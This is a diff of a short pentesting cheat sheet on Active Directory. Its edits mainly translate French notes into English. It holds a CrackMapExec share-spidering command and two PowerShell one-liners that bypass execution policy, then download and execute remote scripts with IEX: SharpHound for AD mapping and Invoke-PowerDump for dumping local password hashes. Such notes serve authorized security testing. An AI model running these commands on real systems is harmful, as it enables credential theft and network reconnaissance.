@@ -1,6 +1,6 @@
 # Pentest Tips
 
-Some tips from a cybersecurity consultant @Wavestone.
+Some tips from a cybersecurity consultant in France.
 
 ## Pentest Active Directory
 
@@ -14,13 +14,13 @@ cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
 
 ### PowerShell one-liners
 
-Bloodhound : Cartographie de l'Active Directory. Cette commande permet de collecter les données sur la machine.
+Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
 ```
 
-PowerDump : Permet de dumper les hashs des comptes locaux :
+PowerDump : Dump all local accounts :
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump
